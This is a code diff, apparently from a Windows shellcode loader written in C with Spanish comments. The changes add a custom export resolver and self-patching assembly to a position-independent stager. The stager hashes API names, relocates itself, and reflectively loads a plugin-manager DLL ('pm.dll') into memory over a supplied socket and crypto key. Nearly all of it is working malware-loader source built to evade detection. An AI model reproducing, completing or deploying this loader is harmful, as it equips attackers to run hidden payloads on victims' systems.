@@ -146,7 +146,7 @@ void PerformBaseRelocation(PMEMORYMODULE module, int delta){
 			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
 			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + sizeof(IMAGE_BASE_RELOCATION));
 
-			for (int i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
+			for (UINT i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
 				//Los 4 bits superiores establecen el tipo de relocalizacion
 				int type = *relInfo >> 12;
 				//y los 12 inferiores el offset
@@ -439,7 +439,71 @@ ULONG fnv32(register const char *s){
     return hash;
 }
 
-FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ULONG hash){
+bool mystrcmp(const char *s1, const char *s2){
+	register int ret = 0;
+	while (!(ret = *(unsigned char *)s1 - *(unsigned char *)s2) && *s2) ++s1, ++s2;
+	return (ret == 0);
+}
+
+_LoadLibraryA __declspec(naked) GetLoadLib(){
+	__asm{
+		mov eax, 0xDEADBEEF
+		ret
+	}
+}
+
+FARPROC WINAPI GetProcAddressReplacement(HINSTANCE hModule, LPCSTR lpProcName){
+    FARPROC proc = NULL;
+
+    if(*((USHORT*)hModule)==IMAGE_DOS_SIGNATURE){
+        PIMAGE_NT_HEADERS PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ULONG)hModule);
+        if(PE->Signature == IMAGE_NT_SIGNATURE && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
+            register PIMAGE_EXPORT_DIRECTORY ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(ULONG)hModule);
+			ULONG* functionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
+			USHORT* ordinalRVAs = (USHORT*)(ExpDir->AddressOfNameOrdinals+(ULONG)hModule);
+			if IMAGE_SNAP_BY_ORDINAL((DWORD)lpProcName){
+				WORD  ord = LOWORD(lpProcName);
+				DWORD ord_base = ExpDir->Base;
+				
+				if (ord < ord_base || ord > ord_base + ExpDir->NumberOfFunctions)
+					return NULL;
+				
+				proc = (FARPROC)((char*)hModule + functionRVAs[ord - ord_base]);
+			}else{
+				register char** ExportNames = (char**)(ExpDir->AddressOfNames+(ULONG)hModule);
+				register int i;
+				for(i = 0;ExportNames[i];i++){
+					if(mystrcmp(ExportNames[i]+(ULONG)hModule, lpProcName) == true){
+						proc = (FARPROC)(functionRVAs[ordinalRVAs[i]] + (ULONG)hModule);
+						break;
+					}
+				}
+			}
+			if ((char*)proc >= (char*)ExpDir &&
+				(char*)proc < (char*)ExpDir + PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
+
+					register char dll_name[64];
+					register ULONG size = 0;
+					register char* f_name;
+
+					while(*((char*)proc + size) >= '.' && *((char*)proc + size) <= 'z'){
+						if (*((char*)proc+size) == '.')
+							f_name = dll_name + size;
+						dll_name[size++] = *((char*)proc+size);
+					}
+					dll_name[size] = '\0';
+					*f_name++ = '\0';
+
+					HMODULE new_mod = GetLoadLib()(dll_name);
+					if (new_mod)
+						proc = GetProcAddressReplacement(new_mod, (LPCSTR)f_name);
+			}
+        }
+    }
+    return proc;
+}
+
+FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule, ULONG hash){
     register PIMAGE_NT_HEADERS PE;
     register FARPROC proc = NULL;
     register PIMAGE_EXPORT_DIRECTORY ExpDir = NULL;
@@ -453,9 +517,9 @@ FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ULONG hash){
             register int i;
             for(i = 0;ExportNames[i];i++){
                 if(fnv32(ExportNames[i]+(ULONG)hModule) == hash){
-                    ULONG* funtionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
+                    ULONG* functionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
                     USHORT* ordinalRVAs = (USHORT*)(ExpDir->AddressOfNameOrdinals+(ULONG)hModule);
-                    proc = (FARPROC)(funtionRVAs[ordinalRVAs[i]] +(ULONG)hModule);
+                    proc = (FARPROC)(functionRVAs[ordinalRVAs[i]] +(ULONG)hModule);
                     break;
                 }
             }
@@ -530,7 +594,7 @@ void Payload(PSHELLCODE_CONTEXT scc){
         if (nChecksum == oChecksum){
             //Cargamos y ejecutamos el PluginManager
             WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
-            char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '4', '\0'};
+            char sPMEntry[]     = {'_', 'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '4', '\0'};
 
             PMEMORYMODULE PM_Mod = (PMEMORYMODULE)scc->RtlAllocateHeap_(scc->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));;
             //Si hemos podido cargar el PM...
@@ -555,10 +619,6 @@ void Payload(PSHELLCODE_CONTEXT scc){
     return;
 }
 
-FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
-    return GetProcAddressByHash(hModule, fnv32(lpProcName));
-}
-
 void scInit(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY){
     DEFINE_SHELLCODE_STR(["MSVCRT", "NTDLL", "KERNEL32", "WS2_32", "ADVAPI32"])
 
@@ -574,6 +634,9 @@ get_delta:
     }
 
     scc->delta = d;
+	//Parcheamos GetLoadLib() para que devuelva el puntero (A modo de variable global)
+	*(PDWORD)((PBYTE)GetLoadLib + 1 + scc->delta) = (DWORD)pLoadLibA;
+
     scc->NTDLL              = pLoadLibA(sNTDLL);
     scc->memcpy_            = (_memcpy)GetProcAddressByHash(scc->NTDLL, FNV("memcpy"));
     scc->memset_            = (_memset)GetProcAddressByHash(scc->NTDLL, FNV("memset"));
@@ -605,7 +668,7 @@ get_delta:
     scc->free_              = (_free)GetProcAddressByHash(scc->MSVCRT, FNV("free"));
 
     scc->LoadLibraryA_      = pLoadLibA;
-    scc->GetProcAddressA_   = (_GetProcAddress)((PBYTE)GPA_WRAPPER+scc->delta);
+	scc->GetProcAddressA_   = (_GetProcAddress)((PBYTE)GetProcAddressReplacement+scc->delta);
     scc->hSocket            = hSocket;
     scc->hKey               = hKEY;
 
@@ -633,7 +696,7 @@ int main(int argc, char **argv){
 
     dwSize = (PBYTE)main - (PBYTE)Start;
 
-    sprintf_s(szBinFile, MAX_PATH, "%s.bin", argv[0]);
+	sprintf_s(szBinFile, MAX_PATH, "loader.bin");
     
     fopen_s(&pfBin, szBinFile, "wb");
     fwrite((PBYTE)Start, dwSize, 1, pfBin);
